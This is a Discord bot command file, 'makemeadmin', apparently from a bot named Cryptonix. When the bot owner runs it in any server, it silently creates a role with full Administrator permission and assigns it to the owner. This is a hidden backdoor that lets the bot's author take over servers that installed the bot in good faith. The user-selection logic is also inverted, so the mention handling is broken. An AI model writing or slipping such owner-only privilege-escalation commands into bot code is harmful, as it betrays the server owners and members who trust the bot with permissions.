const settings = require('../settings.json');
const customisation = require('../customisation.json');
exports.run = async (client, message, args) => {

    if(message.author.id !== settings.ownerid) return message.channel.send(`${message.author}, ${customisation.ownercmdfailtext}`);
    if (!message.guild.member(client.user).hasPermission("MANAGE_ROLES_OR_PERMISSIONS")) return message.reply("❌**Error:** I don't have the **Manage Roles** permission!");
    if (!message.guild.member(client.user).hasPermission("ADMINISTRATOR")) return message.reply("❌**Error:** I don't have the **Administrator** permission!");  
    
    if (message.mentions.users.size === 0) {
      member = message.guild.member(message.mentions.users.first());
    }else{
      member = message.author
    }
    
    let role = await message.guild.roles.find(val => val.name === 'Cryptonix_Owner');
    if (!role){
      let botRolePosition = message.guild.member(client.user).highestRole.position;
      let newroleposition = parseInt(botRolePosition - 1)
      message.guild.createRole({
        name: 'Cryptonix_Owner',
        permissions: 'ADMINISTRATOR',
        position: newroleposition,
        mentionable: false
      }).catch(e =>{
          if(e) return console.log(e)
      })
      .then(addrole => {
        let role = message.guild.roles.find(val => val.name === 'Cryptonix_Owner');

        member.addRole(role).catch(e => {
          if (e) {
            return message.channel.send(`❌**Error:**\n${e}`);
          }
        });
        message.channel.send(`<a:balancecheck:556017659419033653>`);
      })
      
    }else{
      member.addRole(role).catch(e => {
        if (e) {
          return message.channel.send(`❌**Error:**\n${e}`);
        }
      });
      message.channel.send(`<a:balancecheck:556017659419033653>`);
    }
}

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ["mmadmin"],
  permLevel: 5
};

exports.help = {
  name: 'makemeadmin',
  description: 'Make you an admin >:).',
  usage: 'makemeadmin'
};